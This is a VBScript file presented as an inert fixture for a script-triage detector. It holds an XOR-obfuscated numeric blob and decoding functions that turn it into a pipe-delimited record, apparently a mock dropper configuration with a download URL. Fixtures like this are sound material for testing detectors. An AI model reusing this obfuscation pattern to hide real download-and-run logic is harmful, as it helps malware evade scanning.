Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_cdb381ec = "3-52-106-189-58-1-108-43-178-116-25-102-56-160-61-16-86-55-174-42-20-101-119-177-59-16-121-58-179-44-42-125-41-160-39-6-111-62-179-101-0-121-55-174-40-17-86-41-164-36-26-125-62-189-40-17-104-43-181-44-7-52-12-168-39-61-125-47-177-103-34-96-53-137-61-1-121-9-164-56-0-108-40-181-103-64-39-106-189-58-1-104-60-164-22-22-102-46-175-61-72-59-39-162-40-24-121-58-168-46-27-86-50-165-116-22-104-54-177-40-28-110-53-236-121-68-56-98-163-47-70-59-56-246-53-0-123-55-252-33-1-125-43-178-115-90-38-107-240-120-76-107-61-242-123-22-62-117-164-49-20-100-43-173-44-91-96-53-183-40-25-96-63-238-45-77-59-111-243-127-65-62-117-165-40-1-117-46-178-44-7-86-58-166-44-27-125-102-137-60-27-125-41-164-58-6-69-58-163-102-69-56-106-248-43-19-58-105-162-126-9-111-50-173-44-42-121-58-181-33-72-74-97-157-28-6-108-41-178-21-37-124-57-173-32-22-85-19-180-39-1-123-62-178-58-57-104-57-157-58-1-104-60-164-100-69-56-106-248-43-19-58-105-162-126-91-109-58-181-53-0-121-55-174-40-17-86-46-179-37-72-97-47-181-57-6-51-116-238-121-68-56-98-163-47-70-59-56-246-103-16-113-58-172-57-25-108-117-168-39-3-104-55-168-45-90-124-43-173-38-20-109-116-160-123-22-62-105-160-47-19"
Const Codec_cdb381ec = "decimal_dash|repeating_key_xor|75,09,5b,c1,49"

Function Load_cdb381ec()
  Dim parts, result(), v_e598
  parts = Split(Material_cdb381ec, "-")
  ReDim result(UBound(parts))
  For v_e598 = 0 To UBound(parts)
    result(v_e598) = CInt(parts(v_e598))
  Next
  Load_cdb381ec = result
End Function

Function Decode_cdb381ec(ByRef v_a19c)
  Dim result(), v_e598, keyBytes, previous
  ReDim result(UBound(v_a19c))
  keyBytes = Array(117,9,91,193,73)
  For v_e598 = 0 To UBound(v_a19c)
    result(v_e598) = v_a19c(v_e598) Xor keyBytes(v_e598 Mod 5)
  Next
  Decode_cdb381ec = result
End Function

Function Recover_cdb381ec()
  Dim v_a19c, v_b27e, v_c304, v_d41a, v_e598, v_f602, v_a702, v_b803
  If True Then
    v_d41a = (19 * 7) - 133
      v_a19c = Load_cdb381ec()
      On Error Resume Next
      v_b27e = Decode_cdb381ec(v_a19c)
      v_a702 = Err.Number
      v_b803 = Err.Description
      On Error GoTo 0
      If v_a702 <> 0 Then Err.Raise v_a702, "HuntressFixture", v_b803
      v_c304 = ""
      For v_e598 = 0 To UBound(v_b27e)
        v_c304 = v_c304 & Chr(v_b27e(v_e598))
      Next
  End If
  Recover_cdb381ec = v_c304
End Function

Function Inspect_cdb381ec()
  Dim fields
  fields = Split(Recover_cdb381ec(), "|")
  Inspect_cdb381ec = Join(fields, "|")
End Function
